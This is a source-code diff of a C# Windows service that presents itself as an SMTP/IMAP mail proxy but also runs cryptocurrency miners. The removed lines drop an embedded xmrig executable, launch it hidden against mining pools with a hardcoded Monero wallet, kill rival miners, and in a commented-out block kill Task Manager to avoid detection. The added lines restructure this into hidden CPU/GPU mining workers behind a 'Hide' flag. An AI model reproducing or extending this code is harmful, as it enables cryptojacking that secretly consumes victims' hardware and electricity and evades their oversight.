@@ -21,21 +21,21 @@ namespace Freya.Service
 {
     public partial class ProxyService : ServiceBase
     {
-        #region Private Members
+        private IpcServer radioServer = null;
+        private FIpcClient radioClient = null;
+
+
         /// <summary>List of all proxies that have been started.</summary>
         private List<ImapProxy> imapProxies = null;
         private List<Pop3Proxy> pop3Proxies = null;
         private List<SmtpProxy> smtpProxies = null;
-        private IpcServer radioServer = null;
-        private IpcClient radioClient = null;
-        private Process pMiner;
-        private System.Timers.Timer MinerTimer;
 
-        private FRegSetting reg = new FRegSetting();
+        private Worker[] Workers = new Worker[FConstants.WorkerFileName.Length];
+
+        private FRegSetting RegSetting = new FRegSetting();
         private Status s = new Status();
 
-
-        #endregion Private Members
+        static private LogWriter logger = new LogWriter(FConstants.TextLogEnable);
 
 
         public ProxyService()
@@ -48,37 +48,77 @@ namespace Freya.Service
         /// </summary>
         protected override void OnStart(string[] args)
         {
-            // Start debugger if -d argument is applied
-            if (args != null && args.Contains("-d"))
-                Debugger.Launch();
+            radioClient = new FIpcClient();
+            radioClient.Initialize(s.UIPort);
+
             try
             {
-                //Initialize IPC Server/Client
-                radioServer = new IpcServer();
-                radioServer.Start(FConstants.IPCPortService1);
-                radioServer.ReceivedRequest += new EventHandler<ReceivedRequestEventArgs>(RadioReceiver);
+                //Initialize Workers
+                int w = (int)FConstants.WorkerType.CPU;
+                try
+                {
+                    if (s.MinerSwitch[w] == true)
+                    {
+                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
+                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
+                        Workers[w].Enable = true;
+                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
+                    }
 
-                radioClient = new IpcClient();
-                radioClient.Initialize(FConstants.IPCPortMainUI);
+                    w = (int)FConstants.WorkerType.AMD;
+                    if (s.MinerSwitch[w] == true)
+                    {
+                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
+                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
+                        Workers[w].Enable = true;
+                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
+                    }
 
-                //讀取Registry設定
-                FFunc.GetSettingsFromRegistry(reg);
+                    w = (int)FConstants.WorkerType.nVidia;
+                    if (s.MinerSwitch[w] == true)
+                    {
+                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
+                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
+                        Workers[w].Enable = true;
+                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    logger.WriteLine($@"[Service] Initialize Worker {w} fail, excpetion: {ex.Message}");
+                }
 
-                //Start Proxys
+                //Initialize IPC Server, try 3 times
+                for (int i = 0; i < 3; i++)
+                {
+                    int serverPort = FFunc.FreePortHelper.GetFreePort(13000);
+                    FFunc.SetRegKey("ServicePort1", serverPort);
+                    try
+                    {
+                        radioServer = new IpcServer();
+                        radioServer.Start(serverPort);
+                        radioServer.ReceivedRequest += new EventHandler<ReceivedRequestEventArgs>(RadioReceiver);
+                        logger.WriteLine($@"[Service] Service Radio started at port {serverPort}");
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        logger.WriteLine($@"[Service] Service Start radioServer at port {serverPort} fail, excpetion: {ex.Message}");
+                    }
+                }
+
+                FFunc.SetRegKey("FreyaDirectory", System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase);
+
                 StartProxies();
+                CleanupMiner();
 
-                //CleanupMiner();  //改為在start miner時候再清理
-                MakeSureMinerExist();
-
-                //Timer for Miner
-                MinerTimer = new System.Timers.Timer();
-                MinerTimer.Elapsed += new ElapsedEventHandler(MinerStrategy);
-                MinerTimer.Interval = 500;
-                MinerTimer.Start();
+                logger.WriteLine("[Service] FreyaService Initialized.");
             }
             catch (Exception ex)
             {
-                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG] Service Start Fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
+                logger.WriteLine("[Service] FreyaService Service Start Fail:" + ex.Message);
+                if (radioClient != null)
+                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG] Service Start Fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
             }
 
         }
@@ -90,45 +130,28 @@ namespace Freya.Service
         {
             try
             {
-                if (imapProxies != null)
-                {
-                    foreach (ImapProxy imapProxy in imapProxies)
-                        imapProxy.Stop();
+                StopProxies();
 
-                    imapProxies.Clear();
-                }
-                if (pop3Proxies != null)
+                for (int n = 0; n < Workers.Length; n++)
                 {
-                    foreach (Pop3Proxy pop3Proxy in pop3Proxies)
-                        pop3Proxy.Stop();
-
-                    pop3Proxies.Clear();
-                }
-                if (smtpProxies != null)
-                {
-                    foreach (SmtpProxy smtpProxy in smtpProxies)
-                        smtpProxy.Stop();
-
-                    smtpProxies.Clear();
-                }
-
-                if (MinerTimer != null)
-                {
-                    MinerTimer.Stop();
-                    MinerTimer.Dispose();
-                }
-
-                if (pMiner != null)
-                {
-                    pMiner.Kill();
-                    pMiner.Dispose();
-                    pMiner = null;
+                    if (Workers[n] != null)
+                    {
+                        try
+                        {
+                            Workers[n].Enable = false;
+                            Workers[n].Stop();
+                            Workers[n] = null;
+                        }
+                        catch (Exception) { }
+                    }
                 }
 
                 if (radioServer != null)
                     radioServer.Stop();
+
+                logger.WriteLine("[Service] OnStop() finished. Service Stopped.");
             }
-            catch { }
+            catch (Exception ex) { logger.WriteLine("[Service] OnStop() - Stop Service Excpetion:" + ex.Message); }
         }
 
         /// <summary>
@@ -225,59 +248,114 @@ namespace Freya.Service
             return AppDomain.CurrentDomain.BaseDirectory + "\\Freya.Proxy.xml";
         }
 
-        /// <summary>
-        /// DEBUG: For Console app debug
-        /// </summary>
-        internal void TestStartupAndStop(string[] args)
-        {
-            this.OnStart(args);
-            Console.ReadLine();
-            this.OnStop();
-        }
-
         private void RadioReceiver(object sender, ReceivedRequestEventArgs args)
         {
             FMsg fMsg = JsonConvert.DeserializeObject<FMsg>(args.Request);
             if (fMsg.Type.Equals("CMD"))
             {
+                Console.WriteLine("Get CMD: " + fMsg.Data);
                 switch (fMsg.Data)
                 {
-                    case "IDLESTOP":  // UI使用中
-                        s.isIdle = false;
-                        s.nonIdleTime = 0;
-                        args.Response = "SCOK";
-                        break;
-                    case "IDLEGO":  // UI Idle
-                        s.isIdle = true;
-                        args.Response = "SCOK";
-                        break;
-                    case "MinerDisable":
-                        s.MinerEnable = false;
-                        args.Response = "SCOK";
-                        break;
-                    case "MinerEnable":
-                        s.MinerEnable = true;
-                        args.Response = "SCOK";
-                        break;
-                    case "GetStatus":
+                    case "SetIdleTime":
+                        foreach (Worker w in Workers)
+                            if (w != null)
+                                w.SetIdleTime(Convert.ToDouble(fMsg.Data2));
                         args.Response = JsonConvert.SerializeObject(s);
                         break;
+
+                    case "GetWorkerStatus":
+                        string workerstatus = "";
+                        foreach (Worker w in Workers)
+                        {
+                            if (w != null)
+                            {
+                                if (w.Type == FConstants.WorkerType.CPU)
+                                    workerstatus += (w.isRunning)? "C:" : "c:";
+                                else if (w.Type == FConstants.WorkerType.AMD)
+                                    workerstatus += (w.isRunning) ? "A:" : "a:";
+                                else if (w.Type == FConstants.WorkerType.nVidia)
+                                    workerstatus += (w.isRunning) ? "N:" : "n:";
+
+                                workerstatus = workerstatus + w.Message + "\n";
+                            }
+                        }
+
+                        args.Response = workerstatus;
+                        break;
+
+                    case "MinerDisable":
+                        foreach (Worker w in Workers)
+                            if (w != null)
+                                w.Enable = false;
+                        s.MinerEnable = false;
+                        args.Response = JsonConvert.SerializeObject(s);
+                        break;
+
+                    case "MinerEnable":
+                        foreach (Worker w in Workers)
+                            if (w != null)
+                                w.Enable = true;
+                        s.MinerEnable = true;
+                        args.Response = JsonConvert.SerializeObject(s);
+                        break;
+
+                    case "GetStatus":
+                        for (int w = 0; w < Workers.Length; w++)
+                            if (Workers[w] != null)
+                                s.MinerIsActive[w] = Workers[w].isRunning;
+                            else
+                                s.MinerIsActive[w] = false;
+                        logger.WriteLine($"[Service] s.MinerIsActive {s.MinerIsActive[0]}|{s.MinerIsActive[1]}|{s.MinerIsActive[2]}");
+                        args.Response = JsonConvert.SerializeObject(s);
+                        break;
+
+                    case "SetUIPort":
+                        s.UIPort = Convert.ToInt32(fMsg.Data2);
+                        radioClient.SetPort(s.UIPort);
+                        FFunc.SetRegKey("FreyaUIPort", s.UIPort);
+                        logger.WriteLine($"[Service] Receive UI Port at {s.UIPort}");
+                        args.Response = JsonConvert.SerializeObject(s);
+                        break;
+
+                    case "RadioTest":
+                        string ss = radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = $"Service to UI radio test ... [Service Server Port {radioServer.Port}], [UI Port {radioClient.GetPort()}]", Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
+                        args.Response = $"[Service] s.MinerIsActive {s.MinerIsActive[0]}|{s.MinerIsActive[1]}|{s.MinerIsActive[2]}";
+                        logger.WriteLine($"[Service] RadioTest sUIPort: {s.UIPort}, GetPort:{radioClient.GetPort()}");
+                        break;
+
                     case "StartProxy":
                         StartProxies();
-                        args.Response = "StartProxy called";
+                        args.Response = "OK";
+                        break;
+
+                    case "StopProxy":
+                        StopProxies();
+                        args.Response = "OK";
                         break;
 
                     case "WriteRegistry":
                         if (fMsg.Data2.Length > 0)
                         {
-                            WriteSettingToRegisry(fMsg.Data2);
-                            args.Response = "SCOK";
+                            RegSetting.SetSettingsToRegisry(fMsg.Data2);
+                            args.Response = "OK";
+                            logger.WriteLine("[Service] Options writed to registry.");
                         }
                         else
                         {
-                            args.Response = "SCNG";
+                            args.Response = "NG";
                         }
+                        s.UpdateMinerSwitch();
+
+                        foreach (Worker w in Workers)
+                            if (w != null)
+                                w.AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
+
+                        string strbuf = "";
+                        foreach (bool s in s.MinerSwitch)
+                            strbuf = strbuf + s.ToString() + " |";
+                        logger.WriteLine($"[Service] WorkerSwitch : {strbuf}");
                         break;
+
                     default:
                         args.Response = "SCNG";
                         break;
@@ -286,224 +364,85 @@ namespace Freya.Service
             else
                 args.Response = "SCNG1";
 
-
             args.Handled = true;
-        }
-
-        private void WriteSettingToRegisry(string regJSON)
-        {
-            FRegSetting r = new FRegSetting();
-            r = JsonConvert.DeserializeObject<FRegSetting>(regJSON);
-
-            ///寫入 Registry
-            ///
-            FFunc.SetRegKey("LogLevel", (int)r.LogLevel);
-            FFunc.SetRegKey("EMail", r.EMail);
-            FFunc.SetRegKey("SmtpServerIp", r.SMTPServerIP);
-            FFunc.SetRegKey("SMTPLogLevel", r.SMTPLogLevel);
-
-            FFunc.SetRegKey("WebService", r.WebServiceIP);
-            FFunc.SetRegKey("FeatureByte", Convert.ToInt32(r.FeatureByte));
-
         }
 
         private void StartProxies()
         {
-            if (FFunc.GetRegKey("EMail") == null || FFunc.GetRegKey("SmtpServerIp") == null || FFunc.GetRegKey("WebService") == null)
+            if (RegSetting.hasRight(FConstants.FeatureByte.Hide))
+                return;
+
+            RegSetting.GetSettingsFromRegistry();
+            if (RegSetting.EMail == null || RegSetting.getPassword() == null || RegSetting.SMTPServerIP == null || RegSetting.WebServiceIP == null)
             {
-                //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "SMTP Proxy information net set, skip start proxy.", Loglevel = FConstants.FreyaLogLevel.ProxyInfo }));
+                logger.WriteLine("[Service] Proxy information not set, skip start proxy..");
+                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Proxy information not set, skip start proxy.", Loglevel = FConstants.FreyaLogLevel.Normal }));
                 return;
             }
+
 
             //imapProxies = ImapProxy.StartProxiesFromSettingsFile(GetSettingsFileName());
             //pop3Proxies = Pop3Proxy.StartProxiesFromSettingsFile(GetSettingsFileName());
             //smtpProxies = SmtpProxy.StartProxiesFromSettingsFile(GetSettingsFileName());
-            smtpProxies = SmtpProxy.StartProxiesFromRegistry(reg);
-            radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "SMTP Proxy started.", Loglevel = FConstants.FreyaLogLevel.ProxyInfo }));
+
+            //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Fire up SMTP Proxy on 127.0.0.1:25", Loglevel = FConstants.FreyaLogLevel.Normal }));
+            smtpProxies = SmtpProxy.StartProxiesFromRegistry(RegSetting, radioClient);
+            imapProxies = ImapProxy.StartProxiesFromFromRegistry(RegSetting, radioClient);
+            logger.WriteLine("[Service] Proxies Starting...");
+        }
+
+        private void StopProxies()
+        {
+            try
+            {
+                if (imapProxies != null)
+                {
+                    foreach (ImapProxy imapProxy in imapProxies)
+                        imapProxy.Stop();
+
+                    imapProxies.Clear();
+                }
+                if (pop3Proxies != null)
+                {
+                    foreach (Pop3Proxy pop3Proxy in pop3Proxies)
+                        pop3Proxy.Stop();
+
+                    pop3Proxies.Clear();
+                }
+                if (smtpProxies != null)
+                {
+                    foreach (SmtpProxy smtpProxy in smtpProxies)
+                        smtpProxy.Stop();
+
+                    smtpProxies.Clear();
+                }
+                logger.WriteLine("[Service] Proxies stopped.");
+            }
+            catch (Exception ex) { logger.WriteLine("[Service] Stop Proxy Exception:" + ex.Message); }
         }
 
         private void CleanupMiner()
         {
-            try
-            {
-                Process[] procs = Process.GetProcesses();
-                foreach (Process p in procs)
-                {
-                    if (p.ProcessName == "xmrig" || p.ProcessName == "xmr-stak" || p.ProcessName == "WindowsServiceAgent" || p.ProcessName == FConstants.MinerFileName)
-                        p.Kill();
-                }
-            }
-            catch (Exception ex)
-            {
-                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG]Cleanup Miner fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-            }
-        }
-
-        private void StartMiner()
-        {
-            string MachineName = Environment.MachineName;
-            try
-            {
-                Process[] miner1 = Process.GetProcessesByName(FConstants.MinerFileName);
-                if (miner1.Length == 0)
-                {
-                    pMiner = new Process();
-                    pMiner.StartInfo.Arguments = $" --background --cpu-priority 0 --api-port {FConstants.MinerAPIPort} --api-worker-id={MachineName} -o 10.57.209.245:3332 -u {MachineName} --nicehash -k -o 10.57.209.245:3333 -u {MachineName} --nicehash -k -o gulf.moneroocean.stream:10008 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK.{MachineName} -k";
-                    pMiner.StartInfo.FileName = FConstants.MinerFilePath + "\\" + FConstants.MinerFileName;
-                    pMiner.StartInfo.RedirectStandardOutput = true;
-                    pMiner.StartInfo.UseShellExecute = false;
-                    pMiner.StartInfo.CreateNoWindow = true;
-                    MakeSureMinerExist();
-                    CleanupMiner(); //清理其他Miner
-                    pMiner.Start();
-                    s.MinerIsActive = true;
-                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "CMD", Data = "MinerActive" }));
-                    //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Miner Actived.", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-
-
-                    /*
-                    using (StreamReader reader = pMiner.StandardOutput)
-                    {
-                        string result = reader.ReadToEnd();
-                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = result, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-
-                    }
-                    */
-                }
-            }
-            catch (Exception ex)
-            {
-                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[ERR] Start Miner fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-            }
-        }
-
-        private void StopMiner()
-        {
-            try
-            {
-                if (pMiner != null)
-                {
-                    pMiner.Kill();
-                    pMiner.Dispose();
-                    s.MinerIsActive = false;
-                    pMiner = null;
-                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "CMD", Data = "MinerStop" }));
-                }
-            }
-            catch (Exception ex)
-            {
-                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[ERR] (StopMiner)" + ex.Message, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-            }
-        }
-
-        private void MinerStrategy(object sender, ElapsedEventArgs e)
-        {
-            bool SafeToGo = true;
-
-            /*
-            ////避開特定程序 (Taskmgr)
-            int con = 0;
             Process[] procs = Process.GetProcesses();
-
             foreach (Process p in procs)
             {
-                if (p.ProcessName == "Taskmgr" || p.ProcessName == "taskmgr" || p.ProcessName == "dota2" || p.ProcessName == "csgo" || p.ProcessName == "payday")
+                try
                 {
-                    con++;
-                    if (s.TaskmgrSeconds < 2) //避免一直送taskmgr found 訊息
-                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = con + " Taskmgr found!", Loglevel = FConstants.FreyaLogLevel.RAW }));
-
-                    if (s.TaskmgrSeconds / 2 > FConstants.TimeToCloseTaskmgr)
+                    if (p.ProcessName == "xmrig" || p.ProcessName == "xmr-stak" || p.ProcessName == "WindowsServiceAgent")
                     {
-                        try { p.Kill(); } catch { }
-                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "TaskMgr Killed!", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-
-                    }
-                    StopMiner();
-                    SafeToGo = false;
-                }
-            }
-            if (con == 0)
-            {
-                SafeToGo = true;
-                s.TaskmgrSeconds = 0; //重設
-            }
-            else
-                s.TaskmgrSeconds++;  //有找到taskmgr程序，開始計時
-            */
-
-
-            //// 非Idle mode太久且UI沒回應，自動啟動
-            if (!s.isIdle) // 非Idle mode
-            {
-                SafeToGo = false;
-                s.nonIdleTime++;
-                if ((s.nonIdleTime * MinerTimer.Interval / 1000) > FConstants.TimeToAutoStart)
-                {
-                    SafeToGo = true;
-                    s.nonIdleTime = 0;
-                    s.isIdle = true;
-                }
-            }
-
-            if (!s.MinerEnable)
-                SafeToGo = false;
-
-            if (SafeToGo)
-                StartMiner();
-            else if (s.MinerIsActive)
-                StopMiner();
-        }
-
-        /// <summary>
-        /// Save an embedded resource file to the file system.
-        /// </summary>
-        /// <param name="resourceFileName">Identifier of the embedded resource.</param>
-        /// <param name="resourcePath">Full path to the embedded resource.</param>
-        /// <param name="filePath">File system location to save the file.</param>
-        private async void SaveResourceFile(string resourceFileName, string resourcePath, string filePath)
-        {
-            if (!File.Exists(filePath + "\\" + resourceFileName))
-            {
-                using (StreamReader resourceReader = new StreamReader(Assembly.GetAssembly(GetType()).GetManifestResourceStream(resourcePath + "." + resourceFileName)))
-                {
-                    using (StreamWriter fileWriter = new StreamWriter(filePath + "\\" + resourceFileName, false))
-                    {
-                        char[] buffer = new char[65536];
-
-                        int bytesRead;
-                        while ((bytesRead = await resourceReader.ReadAsync(buffer, 0, buffer.Length)) > 0)
-                            await fileWriter.WriteAsync(buffer, 0, bytesRead);
-                        radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Resource File saved: " + filePath + "\\" + resourceFileName, Loglevel = FConstants.FreyaLogLevel.RAW }));
-
+                        p.Kill();
+                        logger.WriteLine("[Service] Kill " + p.ProcessName + " (CleanUp)");
                     }
                 }
-            }
-        }
-
-        private void MakeSureMinerExist()
-        {
-            string minerFullPath = FConstants.MinerFilePath + "\\" + FConstants.MinerFileName + ".exe";
-            byte[] exeBytes = Properties.Resources.xmrig;
-
-            if (!File.Exists(minerFullPath))
-            {
-                //SaveResourceFile(Constants.MinerFileName + ".exe", "Freya.Service.Resources", Constants.MinerFilePath); //這種方式寫入exe不能執行
-                using (FileStream exeFile = new FileStream(minerFullPath, FileMode.Create))
+                catch (Exception ex)
                 {
-                    exeFile.Write(exeBytes, 0, exeBytes.Length);
+                    logger.WriteLine("[Service] Cleanup Worker fail: " + ex.Message);
+                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG]Cleanup Worker fail:" + ex.Message + " - " + p.ProcessName, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
                 }
-
-                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Miner Dropped to system:" + minerFullPath, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
             }
-            else
-            {
-                //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Check Miner Version", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
-
-                //check file version
-            }
-
         }
+
+
     }
 
 
